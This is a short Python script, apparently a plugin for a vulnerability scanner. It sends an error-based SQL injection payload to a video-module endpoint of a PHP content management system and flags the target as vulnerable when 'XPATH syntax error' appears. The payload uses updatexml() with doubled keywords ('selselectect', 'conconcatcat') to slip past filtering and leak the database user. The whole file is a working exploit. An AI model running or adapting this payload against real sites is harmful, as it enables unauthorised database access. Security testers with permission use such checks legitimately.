#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ='/index.php?m=video&c=video_for_ck&a=add_f_ckeditor&vid=11&title=12&description=%E9%8C%A6&keywords=,upda"texml(1,conconcatcat(0x3a,(selselectect user())),1),1,1,1,1)%23'
bug ="XPATH syntax error:"
info = "/index.php?m=video&c=video_for_ck&a=add_f_ckeditor&vid=11&title=12&description=%E9%8C%A6&keywords=,upda"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
